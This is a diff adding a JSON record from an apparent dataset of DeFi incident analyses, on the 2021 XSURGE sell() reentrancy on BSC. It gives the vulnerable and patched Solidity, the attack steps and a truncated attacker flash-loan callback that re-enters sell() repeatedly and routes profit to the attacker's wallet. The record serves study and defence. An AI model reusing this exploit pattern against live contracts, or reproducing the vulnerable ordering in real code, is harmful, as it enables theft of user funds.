@@ -1,0 +1,36 @@
+{
+ "id": "2021__2021-08-16_XSURGE_Sell_Reentrancy",
+ "source_file": "2021/2021-08-16_XSURGE_Sell_Reentrancy.md",
+ "title": "XSURGE — sell() Reentrancy ETH Double-Withdrawal Analysis",
+ "date": "2021-08-16",
+ "protocol": "XSURGE Token",
+ "chain": "BSC",
+ "loss_raw": "~$5,400,000",
+ "loss_usd": 5400000.0,
+ "root_cause": "The sell() function re-enters via the receive() hook during BNB transfer, allowing repeated sell() calls before the balance is updated",
+ "attack_tx": "0x7e2a...d2 (block 10,087,724)",
+ "vulnerable_contract": "0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21 (XSURGE Token)",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "// ❌ XSURGE Token @ 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21\nfunction sell(uint256 tokenAmount) external returns (bool) {\n    address seller = msg.sender;\n    require(_balances[seller] >= tokenAmount, \"Insufficient balance\");\n\n    // BNB calculation\n    uint256 bnbToReturn = calculateBNBToReceive(tokenAmount);\n\n    // ❌ BNB transferred first → reentrancy possible via receive() hook\n    (bool success,) = payable(seller).call{value: bnbToReturn, gas: 40_000}(\"\");\n    require(success, \"BNB transfer failed\");\n\n    // ❌ Balance deduction after BNB transfer — repeated sell() with original balance on reentry\n    _balances[seller] -= tokenAmount;\n    _totalSupply -= tokenAmount;\n\n    return true;\n}",
+  "// ❌ Root cause: sell() function re-enters via receive() hook during BNB transfer, allowing repeated sell() before balance update\n    function sell(uint256 arg0) external {}  // 0xe4849b32  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "// ✅ CEI pattern applied — balance deducted before BNB transfer\nfunction sell(uint256 tokenAmount) external nonReentrant returns (bool) {\n    address seller = msg.sender;\n    require(_balances[seller] >= tokenAmount, \"Insufficient balance\");\n\n    uint256 bnbToReturn = calculateBNBToReceive(tokenAmount);\n\n    // ✅ State updated first (Effect)\n    _balances[seller] -= tokenAmount;\n    _totalSupply -= tokenAmount;\n\n    // ✅ ETH/BNB transfer last (Interaction)\n    (bool success,) = payable(seller).call{value: bnbToReturn, gas: 40_000}(\"\");\n    require(success, \"BNB transfer failed\");\n\n    return true;\n}",
+  "// ✅ CEI pattern + nonReentrant\n// ✅ Set low gas limit on ETH/BNB transfer (prevents reentrancy)\n\nfunction sell(uint256 tokenAmount) external nonReentrant returns (bool) {\n    // Effect: deduct balance first\n    _balances[msg.sender] -= tokenAmount;\n    _totalSupply -= tokenAmount;\n\n    uint256 bnbToReturn = calculateBNBToReceive(tokenAmount);\n\n    // Interaction: transfer last\n    // Gas capped at 2300 — insufficient gas for reentrancy\n    (bool success,) = payable(msg.sender).call{value: bnbToReturn, gas: 2300}(\"\");\n    require(success, \"BNB transfer failed\");\n    return true;\n}"
+ ],
+ "steps": [
+  "Step 1: PancakeSwap flash loan 10,000 WBNB",
+  "Step 2: Unwrap WBNB → Purchase XSURGE",
+  "Step 3: surge.sell(surgeBalance) — 1st call",
+  "→ receive() triggered during BNB transfer",
+  "Step 4: receive() → surge.sell() repeated reentry",
+  "Step 5: Re-wrap to WBNB → Repay 10,030 WBNB"
+ ],
+ "other_code": [
+  "┌──────────────────────────────────────────────────────────┐\n│ Step 1: PancakeSwap flash loan 10,000 WBNB               │\n│ ipancake.swap(0, 10000e18, this, \"0x00\")                 │\n│ PancakePair @ 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0 │\n└─────────────────────┬────────────────────────────────────┘\n                      │ pancakeCall() callback\n┌─────────────────────▼────────────────────────────────────┐\n│ Step 2: Unwrap WBNB → Purchase XSURGE                    │\n│ wbnb.withdraw(10000e18)                                  │\n│ Surge_Address.call{value: 10000e18}(\"\")  // buy          │\n│ XSURGE @ 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21     │\n└─────────────────────┬────────────────────────────────────┘\n                      │\n┌─────────────────────▼────────────────────────────────────",
+  "// pancakeCall() — flash loan callback\nfunction pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n    wbnb.withdraw(wbnb.balanceOf(address(this)));\n\n    // Purchase XSURGE (BNB → XSURGE)\n    (bool buy_successful,) = payable(Surge_Address).call{value: address(this).balance, gas: 40_000}(\"\");\n\n    // sell() called 7 times — double-withdraw BNB via reentrancy\n    surge.sell(surge.balanceOf(address(this)));  // 1st sell → receive() reentry\n    // ... (7 total, controlled by time counter)\n\n    wbnb.deposit{value: address(this).balance}();\n    wbnb.transfer(Pancake_Pair_Address, 10_030 * 1e18); // repay\n    wbnb.transfer(mywallet, wbnb.balanceOf(address(this)));\n}\n\n// receive() — reentry point (loops while time < 6)\nreceive() external payable {\n    if "
+ ]
+}
